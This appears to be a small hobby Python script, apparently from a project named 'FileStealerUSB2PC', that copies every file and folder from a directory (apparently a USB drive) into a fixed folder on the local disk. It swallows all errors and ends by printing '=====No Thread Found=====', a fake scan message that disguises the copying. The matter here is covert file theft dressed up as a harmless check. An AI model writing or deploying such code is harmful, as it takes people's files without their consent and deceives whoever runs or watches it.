import os
import shutil
from tqdm import tqdm

def copier():
    os.chdir('sth')

    pwd = os.listdir('.')


    Files = []
    Directories = []

    for i in pwd:
        if os.path.isfile(i) == True:
            Files.append(i)
        else:
            Directories.append(i)

    print("Please wait...\n")
    bar = tqdm(total=len(pwd))


    for dir in Directories:
        try:
            shutil.copytree(dir, "D:\MY Projects\Python\FileStealerUSB2PC\Goal\\" + dir)
            bar.update(1)
        except :
            bar.update(1)
    for file in Files:
        try:
            shutil.copyfile(file, "D:\MY Projects\Python\FileStealerUSB2PC\Goal\\"  + file)
            bar.update(1)
        except :
            bar.update(1)
    bar.close()

    print("=====No Thread Found=====")


# ds = "Goal"
# for d in os.walk('.'):
#     for dir in d:
#         shutil.copytree(dir, "Goal" + "/" + "new")

    # for r, d, f in os.walk('.'):
#     for file in f:
#         files.append(file)
#     for dir in d:
#         dirs.append(dir)
    # for dir in d:
    #     print(dir)
# print(files)
